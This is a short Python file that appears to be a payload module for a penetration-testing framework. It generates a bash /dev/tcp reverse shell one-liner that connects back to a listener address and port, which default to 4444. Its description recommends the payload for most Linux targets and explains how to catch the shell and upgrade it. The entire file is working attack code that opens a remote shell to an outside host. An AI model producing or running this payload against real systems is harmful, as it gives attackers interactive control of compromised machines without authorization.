"""Bash /dev/tcp reverse shell one-liner."""

from core.module import PayloadModule
from core.options import OptAddress, OptPort

TEMPLATE = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


class BashReverseTcp(PayloadModule):
    name = "Bash /dev/tcp Reverse Shell"
    description = """
        The classic bash reverse shell: no binaries needed beyond bash
        itself (which keeps its own /dev/tcp pseudo-file). Ideal when the
        target has no nc/python but runs bash — most Linux targets.
        Catch it with exploits/multi/handler or nc -lvnp <LPORT>.
        Note: gives a dumb shell — upgrade with sessions -u.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptAddress("LHOST", required=True,
                                    description="Your listener IP"))
        self.options.add(OptPort("LPORT", default=4444, description="Your listener port"))

    def generate(self):
        return TEMPLATE.format(
            lhost=self.get_option("LHOST"),
            lport=self.get_option("LPORT"),
        )
